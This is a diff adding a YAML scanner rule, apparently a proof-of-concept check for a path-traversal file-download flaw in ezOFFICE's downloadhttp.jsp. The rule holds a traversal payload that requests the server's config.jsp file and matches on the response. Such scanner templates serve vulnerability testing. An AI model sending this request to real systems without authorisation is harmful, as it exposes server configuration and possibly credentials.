@@ -1,0 +1,11 @@
+cve-id: ezoffice-downloadhttp.jsp-filedownload
+rules:
+  - method: GET
+    path: /defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.headers["filename"].contains("../public/edit/jsp/config.jsp")
+severity:
+  high
+type: 
+  filedownload
